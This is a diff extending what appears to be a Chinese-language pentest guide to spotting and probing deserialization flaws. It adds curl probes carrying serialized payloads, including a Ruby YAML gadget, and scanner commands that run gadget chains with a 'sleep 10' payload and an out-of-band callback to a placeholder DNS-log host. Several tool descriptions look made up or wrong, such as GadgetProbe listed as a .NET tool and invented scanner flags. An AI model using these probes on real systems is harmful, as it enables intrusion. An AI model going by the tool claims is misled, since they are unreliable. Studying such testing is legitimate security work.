@@ -65,20 +65,36 @@
 1. **识别序列化特征**
    ```bash
    # Java 序列化特征 (Base64)
-   # 以 rO0 开头
+   # 以 rO0 开头 (Base64 编码的 AC ED 魔术字节)
+   # AC ED 00 05 是 Java 序列化流的魔术字节
+   # Base64 编码后为 rO0AB
    curl "https://target.com/page?data=rO0ABX..."
-   
+
+   # 快速识别 Java 序列化
+   echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" | base64 -d | xxd
+   # 输出应该以 AC ED 开头
+
    # PHP 序列化特征
    # O:<长度>:"<类名>"
+   # 例如：O:4:"User":1:{s:4:"name";s:4:"test";}
    curl "https://target.com/page?user=O:4:%22User%22:1:{s:4:%22name%22;s:4:%22test%22;}"
-   
+
    # .NET ViewState 特征
-   # 以 /wEP 开头
+   # 以 /wEP 开头 (Base64)
    curl "https://target.com/page.aspx" | grep "__VIEWSTATE"
-   
+
    # Python pickle 特征 (Base64)
-   # 通常包含 (dp 开头
+   # 协议 0:以 ( 开头
+   # 协议 2+:以 \x80 开头 (Base64 后为 gAS)
    curl "https://target.com/page?data=KGRw..."
+
+   # Ruby Marshal 特征
+   # \x04\x08 开头 (Base64 后为 BAho)
+   curl "https://target.com/page?data=BAho..."
+
+   # YAML 反序列化特征
+   # 包含 !ruby/object 或 !!python/object
+   curl "https://target.com/page?data=---%0A!ruby/object:Gem:Installer"
    ```
 
 2. **参数模糊测试**
@@ -246,6 +262,68 @@ php phpggc.php monolog/rce1 "echo probe"
 # 发送探测
 curl -X POST https://target.com/api.php \
   -d "data=生成的 Payload"
+```
+
+**Java Deserialization Scanner（OWASP 推荐工具）：**
+
+```bash
+# 工具介绍：Java Deserialization Scanner 是 OWASP 推荐的反序列化漏洞检测工具
+# 支持多种 Gadget 链和多种检测方式
+
+# 1. Burp 插件模式
+# 在 Burp Suite 中安装 Java Deserialization Scanner 插件
+# 自动检测所有请求中的 Java 序列化数据
+
+# 2. 独立扫描模式
+java -jar java-deserialization-scanner.jar \
+  -u https://target.com \
+  -p 8080 \
+  --scan
+
+# 3. 特定 Payload 测试
+java -jar java-deserialization-scanner.jar \
+  -u https://target.com \
+  --gadget CommonsCollections5 \
+  --payload "sleep 10"
+
+# 4. 盲测模式（时间延迟检测）
+java -jar java-deserialization-scanner.jar \
+  -u https://target.com \
+  --blind \
+  --delay-threshold 5
+
+# 5. DNS/HTTP 外带检测
+java -jar java-deserialization-scanner.jar \
+  -u https://target.com \
+  --oob \
+  --oob-server http://your-dnslog.com
+
+# 支持的 Gadget 链：
+# - CommonsCollections (1-7)
+# - CommonsBeanUtils
+# - Groovy
+# - Spring
+# - Hibernate
+# - JBoss
+# - Shiro
+# - WebLogic
+```
+
+**其他推荐工具：**
+```bash
+# Serial Killer - Burp 插件
+# 自动检测和利用 Java 反序列化漏洞
+
+# DetExploit - 自动化检测工具
+java -jar detexploit.jar \
+  -u https://target.com \
+  --scan
+
+# ysoserial-burp - Burp 集成
+# 在 Burp 中直接生成和发送 ysoserial Payload
+
+# GadgetProbe - .NET 反序列化检测
+# 检测 .NET BinaryFormatter 漏洞
 ```
 
 #### 2.4.3 自定义扫描脚本
